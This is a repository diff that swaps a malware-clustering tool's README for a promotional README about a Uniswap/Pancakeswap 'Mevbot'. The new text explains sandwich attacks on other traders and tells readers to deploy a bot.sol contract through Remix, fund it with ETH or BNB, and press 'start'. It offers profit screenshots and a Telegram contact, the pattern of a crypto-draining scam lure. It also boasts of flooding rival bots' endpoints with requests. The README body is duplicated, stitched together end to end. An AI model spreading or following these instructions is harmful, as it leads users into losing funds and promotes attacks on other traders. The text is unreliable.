@@ -1,163 +1,188 @@
-# Cosa Nostra
+![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
 
-Cosa Nostra is an open source software clustering toolkit with a focus on malware analysis. It can create phylogenetic trees of binary malware samples that are structurally similar. It was initially released during SyScan360 Shanghai (2016).
+# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
 
-I basically maintain it since 2016 for my one and only user, who happens to be a friend... Well.
+The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-# Getting started
+> Bot sends the Transaction and sniffs the Mempool
 
-## Required 3rd party tools
+> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
 
-In order to use Cosa Nostra you will need a version of Python 3.X as well as one of the following tools in order to perform code analysis:
+> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
 
- * [IDA](http://www.hex-rays.com) Written in C++. It supports analysing a plethora of executable types that you probably never even heard about. Commercial product. Only the 7.X versions are now supported.
- * [Radare2](http://rada.re) Written in pure C. Same as with IDA, with support for extremely rare CPUs and binary formats. Also, it's open source!
+> This bot performs all of that, faster than 99% of other bots.
 
-## Analysing binaries
+### But ser, there are open source bots that do the same
 
-Once you have installed any of the previously mentioned tools you will need to use the appropriate batch tool to analyse the malware samples, like in the example bellow:
+> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
 
-```
-$ cd $COSA_NOSTRA_DIR
-$ /path/to/ida64 -B -A -S/full/path/to/ida_batch.py example.exe
-```
+### Wen increase aggressiveness ?
 
-Or
+> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
 
-```
-$ cd $COSA_NOSTRA_DIR
-$ python r2_batch.py example.exe
-```
+### What did I learn?
 
-### Automating the Analysis of a Malware Dataset
+> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
 
-The easiest way to analyse a malware dataset is by simply running a command like the following example:
+### So why stop?
 
-```
-$ find /your/malware/dataset/path -type f -exec python r2_batch.py {} ';'
-```
+> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
 
-It can be done in parallel by using the "GNU Parallel" tool, as in the following example:
+### Towards the end I kept getting outcompeted by this individual:
 
-```
-$ find /your/malware/dataset/path -type f | parallel -j 8 ida64 -B -A -S/path/to/ida_batch.py {}
-```
+> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
 
-In the example above, it will launch a total of 8 pyew_batch processes in parallel.
+If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
 
-## Database configuration
+### Bot capabilities:
 
-After the malware samples are analysed, if the analysis was successful, the call graph data for each sample will be stored in, by default, one SQLite database named "db.sqlite". You can configure the database name, path, database system, etc... by editing the file $COSA_NOSTRA_DIR/, as shown bellow:
+1. Check every Contract pair.
+2. Calculate possible profit
+3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
+4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
 
-```
-$ cat config.cfg 
-########################################################################
-# Configuration for SQLite3
-########################################################################
-[database]
-dbn=sqlite
-# Database name
-db=db.sqlite
-```
+### What is Sandwich MEV ?
 
-If you prefer to use, say, a MySQL database system, you can configure it in config.cfg by putting the following configuration sections with the appropriate values for your setup:
+A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
 
-```
-########################################################################
-# Example configuration for MySQL
-########################################################################
+Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
 
-[database]
-dbn=mysql
-# Database hostname or IP address
-host=localhost
-# Database name
-db=db_name
-# Database username
-user=username
-# Database password
-pw=password
-```
+If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
 
-## Clusterization of malware samples
+- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
+- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
 
-This is the step that will take more time. Once you have analysed all the malware samples from your datasets and the call graph signatures, corresponding prime numbers, etc... are calculated and stored in the database, the next step is to find cluster. The tool for doing so is called "cn_clusterer.py". It will make use of the same database configuration file ($COSA_NOSTRA_DIR/config.cfg) in order to extract the call graph signatures for the analysed samples. Running it as simple as doing the following:
+How exactly does the attacker gain revenues during the process? Here is an example.
 
-```
-$ cd $COSA_NOSTRA_DIR
-$ ./cn_clusterer.py
-(...)
-Calculating difference matrix for 2357, iteration 5540280 out of 7507600 (4858784 matches, 600144 cache misses)
-Calculating difference matrix for 2354, iteration 5543020 out of 7507600 (4861293 matches, 600373 cache misses)
-Calculating difference matrix for 471, iteration 5545760 out of 7507600 (4863903 matches, 600373 cache misses)
-(...)
-Making tree for group with 59 sample(s), iteration 0 out of 256
-Making tree for group with 393 sample(s), iteration 1 out of 256
-Making tree for group with 1347 sample(s), iteration 2 out of 256
-(...)
-[Wed Nov  2 13:37:12 2016 2830:140561185462080] Creating unnamed cluster...
-[Wed Nov  2 13:37:12 2016 2830:140561185462080] Creating cluster with name u'Win.Trojan.Skylock-4'...
-[Wed Nov  2 13:37:12 2016 2830:140561185462080] Creating cluster with name u'Win.Downloader.133181-1'...
-[Wed Nov  2 13:37:12 2016 2830:140561185462080] Creating cluster with name u'Win.Trojan.Agent-1213378'...
-[Wed Nov  2 13:37:13 2016 2830:140561185462080] Done processing phylogenetic trees!
-[Wed Nov  2 13:37:13 2016 2830:140561185462080] Done
-```
+1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
+2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
+3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
+4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
+5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
+6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
 
-When the process finishes, clusters grouping the analysed malware samples will be created in the specified database.
+![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
 
-## Watching clusters: the web GUI
+Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
 
-The last step is to launch the web.py based Web application and logging in:
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
 
-```
-$ cd $COSA_NOSTRA_DIR
-$ python cosa_nostra.py [optional port to listen to]
-http://0.0.0.0:YOURPORT/
-```
+1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
 
-Then, open a browser and navigate to the address printed out by cosa_nostra.py. A login form will be displayed asking for a username and password. By default, it's "admin/cosanostra". You can change it in the file $COSA_NOSTRA_DIR/config.py:
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
 
-```
-$ cat config.py
-#!/usr/bin/env python
+3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
 
-#-----------------------------------------------------------------------
-# Configuration for Cosa Nostra
-#-----------------------------------------------------------------------
-DEBUG=False
-CN_USER="admin"
-# SHA1 hash of the password "cosanostra", change to the SHA1 hash of
-# whatever password you prefer.
-CN_PASS="048920dedfe36c112d74dc8108abb4db5185a918"
-(...)
-```
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
 
-Once you're logged in you can select from the left panel one the following options:
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
 
- * Samples: See the samples in the current database.
- * Clusters: See the list of clusters that Cosa Nostra found for the given datasets.
+6. After the transaction is confirmed, it's your own BOT now.
 
-In the "Clusters" view, one can select different clusters and view a hierarchical graph of the discovered malware family.
+7. Deposit funds to your exact contract/bot address.
 
-### Screenshots
+8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
 
-List of clusters as shown in Cosa Nostra:
+I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
 
-![List of clusters as shown in Cosa Nostra](
-https://github.com/joxeankoret/cosa-nostra/raw/master/screenshots/clusters-list.png)
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
 
-A small cluster of Trojan.Backspace-1 (name by ClamAV):
+To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.![Uniswap Mevbot](https://i.ibb.co/dDpvy0F/1.jpg)
 
-![A small cluster of Trojan.Backspace-1, name by ClamAV](https://github.com/joxeankoret/cosa-nostra/blob/master/screenshots/cluster-trojan-backspace.png)
+# Mevbot Smartcontract for Uniswap (v3) & Pancakeswap (v3) - Monitor the mempool, placing a higher gas fee, extract profit by buying and selling assets before the original transaction takes place. 
 
-A small cluster of MiniDukes:
+The code was never meant to be shown to anybody. My commercial code is better and this was intended to be "tested in production" and a ton of quality tradeoffs have been made. Never ever did I plan to release this publicly, lest I "leak my alpha". But nonetheless I would like to show off what I've learned in the past years.
 
-![A small cluster of MiniDukes](https://github.com/joxeankoret/cosa-nostra/blob/master/screenshots/small-cluster-miniduke.png)
+> Bot sends the Transaction and sniffs the Mempool
 
-A cluster of Kazy/Bifroses:
+> Bots then compete to buy up the token onchain as quickly as possible, sandwiching the victims transaction and creating a profitable slippage opportunity
 
-![A cluster of Kazy/Bifroses](https://github.com/joxeankoret/cosa-nostra/blob/master/screenshots/kazi-bifrose-cluster.png)
+> Sending back the ETH/BNB and WETH/WBNB to the contract ready for withdrawal.
 
-A small part of a really big cluster of FannyWorms:
+> This bot performs all of that, faster than 99% of other bots.
 
-![A small part of a really big cluster of FannyWorms](https://github.com/joxeankoret/cosa-nostra/blob/master/screenshots/big-cluster-fannyworm.png)
+### But ser, there are open source bots that do the same
+
+> Yes, there indeed are. Mine was first, tho. And I still outperform them. Reading their articles makes me giggle, as i went through their same pains and from a bot builder to a bot builder, i feel these guys. <3
+
+### Wen increase aggressiveness ?
+
+> As i've spent a year obsessing about this, i have a list of target endpoints that I know other bots use, which i could flood with requests in order to make them lose up to 5 seconds of reaction time and gain an edge over them.
+
+### What did I learn?
+
+> MEV, Frontrunning, EIP-1559, "The Dark Forest", all sorts of tricks to exploit more web2 kind of architectures. And all sorts of ins and outs aboout Uniswap OR Pancakeswap
+
+### So why stop?
+
+> I've made some profits from this but now using some other better commercial methods, ready to share what I have learnt so devs don't need to go through the same pain.
+
+### Towards the end I kept getting outcompeted by this individual:
+
+> https://etherscan.io/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+> https://bscscan.com/address/0x55659ddee6cb013c35301f6f3cc8482de857ea8e
+
+If this is you, I'd like to congratulate you on your badassery. I have been following your every trade for months, and have not been able to figure out how you get ±20 secs earlier than I do. What a fucking chad.
+
+### Bot capabilities:
+
+1. Check every Contract pair.
+2. Calculate possible profit
+3. Automatically submit transaction with higher gas fee than target (in order to get tokens first, low price > seek profit, gas fee included in calculation)
+4. Automatically sell tokens with prior gas fee (in order to be the first who sell tokens at higher price)
+
+### What is Sandwich MEV ?
+
+A sandwich attack involves "sandwiching" the victim's transactions between two transactions initiated by the searchers/attackers, whose reordering of the transactions inflicts an implicit loss on the victimized users and possibly benefits the attacker. 
+
+Sandwich MEV exists because the user has to send the intended transactions to the blockchain's mempool, the waiting area for the transactions that haven't been put into a block and need confirmation from the block's miner. 
+
+If the user sets a too-high slippage for the transaction, the searcher could exploit the opportunity by:
+
+- Setting higher gas fees and miner tips for the searcher's first transaction than the victim to make it accepted earlier by the block's miner. 
+- Then the searcher would send another transaction with equal or lower gas fees to make sure this transaction is accepted later by the miner than the victim, whose transaction would be squeezed by the attacker's transactions.
+
+How exactly does the attacker gain revenues during the process? Here is an example.
+
+1. In a Uniswap liquidity pool, Bob is a retail investor who wants to trade 1000 $WETH for $USDT. His transaction has been sent to the mempool, making him the victim of a sandwich arbitrage. The transaction is marked as ①  in the figure below. 
+2. Unfortunately, Alice, the searcher who has been scanning the mempool, detects Bob's swapping transaction. 
+3. Alice makes a transaction of selling 650 $WETH and sends it to the mempool. In the end, she receives 1,842,200 $USDT at the exchange rate of 1 $WETH for 2,834 $USDT. The block's miner accepts this swapping first because Alice pays higher gas fees or miner tips. The swapping causes the exchange rate to change to 1 $WETH for 2,821 $USDT. This transaction and one Alice sent after Bob's are marked as ② in the figure below. 
+4. Bob's transaction goes through the mempool and to the block selling 1000 $WETH for 2,821,000 $USDT, which he should have been able to get 2,834,000 $USDT. 
+5. Alice's selling of 1,842,200 $USDT passes the mempool and gets recorded by the miner in the block. She receives 652.9 $WETH.  
+6. All three transactions are marked as ③ in the figure below, which shows in the order the miner accepts them.
+
+![Mevbot Uniswap](https://i.ibb.co/jgyGmdc/2.webp)
+
+Alice's revenue from this Sandwich arbitrage is 2.9 $WETH. The cost is the gas fees and miner tips she gives to the miner for reordering. Assuming it's 1.2 $WETH. In the end, Alice's profit is 1.7 $WETH.
+
+# How to implement Sandwich MEV (MEVBOT) with a smart contract on the Ethereum blockchain ?
+
+1. Access the Solidity Compiler: [Remix IDE](https://remix.ethereum.org)
+
+2. Click on the "contracts" folder and then create "New File". Rename it as you like, i.e: “bot.sol".
+
+3. Copy and Paste the code from v3 folder with name bot.sol into Remix IDE.
+
+4. Move to the "Solidity Compiler" tab, select version "0.6.6" or 0.6.12" and then "Compile".
+
+5. Move to the "Deploy" tab, select "Injected Web 3" environment. Connect your Metamask with Remix then "Deploy" it.
+
+6. After the transaction is confirmed, it's your own BOT now.
+
+7. Deposit funds to your exact contract/bot address.
+
+8. After your transaction was confirmed, Start the bot by clicking the “start” button. Withdraw anytime by clicking the “withdrawal” button
+
+I know, this bot only works on the mainnet, but once you can still  deploy on the testnet. and you need to know if this run on testnet and then you call the withdrawal function, it just transfers back your funds without including any profits.
+
+If u want to get priority first for your transaction and get profit from the original transaction, try with 0.5 - 5 ETH or 3 - 10 BNB as contract/bot amount balance. see this contract as reference [jaredfromsubway.eth](https://etherscan.io/address/0x6b75d8af000000e20b7a7ddf000ba900b4009a80#internaltx) this contract use 50 ETH as contract balance to running contract bot.
+
+To withdraw your WETH/WBNB balance from the contract, the contract/bot must have ETH/BNB to pay gas fees.
+
+### Proof By Your Friends
+
+> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/HdLLzFb/3.png)
+> ![Profit by Sandwich Mev Smartcontract](https://i.ibb.co/dg33JdH/4.png)
+> # Help
+If at any time you encounter any issues with the contract setup, contact our team at https://t.me/UniswapMevbots  🛡️
